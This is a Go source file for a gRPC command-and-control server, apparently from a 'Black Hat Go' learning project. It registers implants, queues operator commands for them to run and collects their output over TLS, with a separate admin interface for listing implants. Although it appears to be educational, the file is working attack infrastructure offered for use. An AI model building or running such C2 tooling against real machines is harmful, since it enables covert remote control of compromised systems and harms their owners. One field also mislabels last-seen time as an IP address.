package main

import (
	"blackhatgo/c2c/grpcapi"
	"context"
	"database/sql"
	"errors"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

const banner = `
  ______ ___     _______   ______   
 /      |__ \   /  _____| /  __  \  
|  ,----'  ) | |  |  __  |  |  |  | 
|  |      / /  |  | |_ | |  |  |  | 
|  '----./ /_  |  |__| | |  '--'  | 
 \______|____|  \______|  \______/
------------ C2 Server ------------
`

type implantServer struct {
	grpcapi.UnimplementedImplantServer
	work, output chan *grpcapi.Command
	implants     map[uuid.UUID]time.Time
	db           *sql.DB
}

type adminServer struct {
	grpcapi.UnimplementedAdminServer
	work, output chan *grpcapi.Command
	implants     map[uuid.UUID]time.Time
	db           *sql.DB
}

func NewImplantServer(work, output chan *grpcapi.Command, implants map[uuid.UUID]time.Time, db *sql.DB) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	s.implants = implants
	s.db = db
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command, implants map[uuid.UUID]time.Time, db *sql.DB) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	s.implants = implants
	s.db = db
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// No work
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *implantServer) RegisterNewImplant(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.RegisterResponse, error) {
	implantId, err := uuid.NewUUID()
	if err != nil {
		return nil, err
	}
	s.implants[implantId] = time.Now()
	insertImplant(s.db, implantId, time.Now(), time.Now())

	response := grpcapi.RegisterResponse{
		Id: implantId.String(),
	}
	return &response, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

func (s *adminServer) ListRegisteredImplants(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.ImplantsList, error) {
	implants, err := listImplants(s.db)
	if err != nil {
		return nil, err
	}
	response := grpcapi.ImplantsList{}
	for _, implant := range implants {
		readableTime := implant.LastSeen.Format("2006-01-02 15:04:05")
		data := &grpcapi.ImplantData{
			Id:        implant.ID.String(),
			IpAddress: readableTime,
		}
		response.Implants = append(response.Implants, data)
	}
	return &response, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)

	db, err := sql.Open("sqlite3", "server.db?_loc=auto&parseTime=true")
	if err != nil {
		log.Fatalln(err)
	}
	defer db.Close()
	err = createTables(db)
	if err != nil {
		log.Fatalln(err)
	}

	creds, err := credentials.NewServerTLSFromFile("server.crt", "server.key")
	if err != nil {
		log.Fatalln(err)
	}
	opts = append(opts, grpc.Creds(creds))

	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implants := make(map[uuid.UUID]time.Time)
	implant := NewImplantServer(work, output, implants, db)
	admin := NewAdminServer(work, output, implants, db)

	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err)
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)

	fmt.Print(banner)

	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
